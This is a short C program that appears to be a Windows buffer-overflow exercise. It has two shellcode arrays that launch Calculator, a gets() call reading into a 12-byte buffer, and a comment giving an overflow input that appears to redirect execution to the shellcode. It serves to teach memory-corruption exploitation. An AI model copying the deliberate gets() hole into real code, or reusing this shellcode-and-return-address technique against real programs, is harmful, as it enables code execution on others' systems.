#include <stdio.h>
#include <Windows.h>

char shellcode1[] = "\x55\x8B\xEC\x83\xEC\x48"
		"\xC6\x45\xF4\x63\xC6\x45\xF5\x61\xC6"
		"\x45\xF6\x6C\xC6\x45\xF7\x63\xC6\x45"
		"\xF8\x00\x6A\x01\x8D\x45\xF4\x50\xA1"
		"\x00\x70\x41\x00\xFF\xD0\x6A\x01\xA1"
		"\xC0\x70\x41\x00\xFF\xD0";

char shellcode2[] = "\x55\x8B\xEC\x83\xEC\x48"
	"\xC6\x45\xF4\x63\xC6\x45\xF5\x61\xC6"
	"\x45\xF6\x6C\xC6\x45\xF7\x63\xC6\x45"
	"\xF8\x00\x6A\x01\x8D\x45\xF4\x50\xA1"
	"\x20\x70\x41\x00\xFF\xD0\x6A\x01\xA1"
	"\x78\x70\x41\x00\xFF\xD0";


void main()
{
	char szBuffer[12] = { 0 };
//	WinExec("", 1);
//	exit(1);

	printf("이름을 입력하세요: ");
	//aaaaaaaaaaaabbbb4`A
	gets(szBuffer);
	printf("당신의 이름은 %s입니다.\n", szBuffer);
}